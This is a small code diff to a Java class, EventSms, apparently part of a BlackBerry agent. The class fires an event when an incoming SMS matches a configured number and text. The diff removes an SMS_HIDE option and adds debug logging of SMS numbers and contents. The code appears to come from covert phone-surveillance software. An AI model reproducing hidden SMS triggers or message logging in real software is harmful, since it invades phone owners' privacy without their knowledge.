@@ -61,18 +61,17 @@ public final class EventSms extends Event implements SmsObserver {
         super();
         setPeriod(NEVER);
 
-        //#ifdef SMS_HIDE
         smsListener = SmsListener46.getInstance();
-        //#else
-        smsListener = SmsListener45.getInstance();
-        //#endif
+
     }
 
     public boolean parse(ConfEvent conf) {
 
         number = conf.getString(Messages.getString("10.1"), ""); //$NON-NLS-1$
         msg = conf.getString(Messages.getString("10.2"), "").toLowerCase(); //$NON-NLS-1$
-
+        //#ifdef DEBUG
+        debug.trace("parse: " + number + " msg: " + msg);
+        //#endif
         return true;
     }
 
@@ -114,6 +113,10 @@ public final class EventSms extends Event implements SmsObserver {
                 onEnter();
                 return true;
             }
+        }else{
+            //#ifdef DEBUG
+            debug.trace("onNewSms, no match. number: " + address + " message: " + message );
+            //#endif
         }
 
         return false;
